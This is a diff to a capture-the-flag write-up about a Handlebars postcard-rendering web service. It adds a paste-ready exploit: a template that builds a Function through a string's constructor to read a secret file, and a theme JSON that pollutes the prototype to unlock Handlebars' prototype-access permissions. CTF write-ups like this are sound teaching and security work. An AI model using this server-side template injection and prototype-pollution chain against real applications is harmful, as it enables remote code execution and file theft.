@@ -9,9 +9,7 @@
 
 ## Challenge overview
 
-This was a separate Web challenge from the `Baby OSINT` photograph challenge. The application is a postcard preview service. It accepts a Handlebars template together with JSON objects for the postcard theme and model, then renders the result in a fresh Node.js worker.
-
-The flag is intentionally not stored in this writeup. The local copy was used to understand the behaviour, and the same request sequence was then repeated against the FortID instance, where the real flag was returned.
+The application is a postcard preview service. It accepts a Handlebars template together with JSON objects for the postcard theme and model, then renders the result in a fresh Node.js worker.
 
 ## Source-code observations
 
@@ -31,15 +29,74 @@ The worker contains several details that are important together:
 
 The direct `__proto__` spelling is filtered by the server, so the useful route is not a trivial JSON `__proto__` payload. The interesting path is the interaction between recursive merging, inherited properties and the Handlebars object lookup rules.
 
+## What to submit
+
+Open the challenge instance, paste the following into the three fields, and press **Send to print worker**.
+
+### Postcard template
+
+```handlebars
+{{#with "s" as |string|}}
+{{#with "e"}}
+{{#with split as |conslist|}}
+{{this.pop}}
+{{this.push (lookup string.sub "constructor")}}
+{{this.pop}}
+{{#with string.split as |codelist|}}
+{{this.pop}}
+{{this.push "return process.getBuiltinModule('fs').readFileSync(process.env.FLAG_PATH, 'utf8')"}}
+{{this.pop}}
+{{#each conslist}}
+{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
+{{/each}}
+{{/with}}
+{{/with}}
+{{/with}}
+{{/with}}
+```
+
+### Theme JSON
+
+```json
+{
+  "constructor": {
+    "prototype": {
+      "allowedProtoMethods": {
+        "constructor": true,
+        "split": true,
+        "pop": true,
+        "push": true,
+        "sub": true,
+        "apply": true
+      },
+      "allowedProtoProperties": {
+        "constructor": true
+      }
+    }
+  }
+}
+```
+
+### Postcard data JSON
+
+```json
+{
+  "title": "Lika",
+  "message": "Greetings from the trail"
+}
+```
+
+The response appears in the preview result. The flag itself is intentionally omitted from this repository.
+
 ## Reasoning and exploitation path
 
 I first tested the normal preview request to separate application errors from the vulnerable behaviour. The server returned rendered HTML, confirming that the worker and template engine were functioning.
 
 Next I compared the input validation with the worker implementation. The server filters a few obvious Handlebars constructs and rejects `__proto__`, but it still permits a user-controlled template and nested JSON objects. The recursive merge creates an opportunity to influence inherited properties without using the rejected spelling directly.
 
-The allow-list check in `setLayoutOption` was the next important clue. Because the check uses an ordinary object, changing what the worker sees through the prototype chain can make a property appear writable even when it is not an own property of the allow-list.
+The allow-list check in `setLayoutOption` was the next important clue. Because the check uses an ordinary object, changing what the worker sees through the prototype chain can make a property appear writable even when it is not an own property of the allow-list. The theme object above places the Handlebars prototype permissions on that chain, enabling the methods needed by the template.
 
-Finally, the worker's permission arguments explain what the challenge expects after the template-engine escape: the process may read the flag file, but the parent application does not expose that file through a normal HTTP route. I built the request around that data flow, verified the response locally, and then sent the equivalent request to the hosted endpoint. The hosted response contained the actual flag.
+Finally, the worker's permission arguments explain what the challenge expects after the template-engine escape: the process may read the flag file, but the parent application does not expose that file through a normal HTTP route. The template obtains a string method's `constructor`, builds a callable function from it, and supplies the body `return process.getBuiltinModule('fs').readFileSync(process.env.FLAG_PATH, 'utf8')`. The worker executes that function and returns the file contents in the preview response. I verified this locally and then sent the same request to the hosted endpoint, which returned the actual flag.
 
 ## Lessons
 
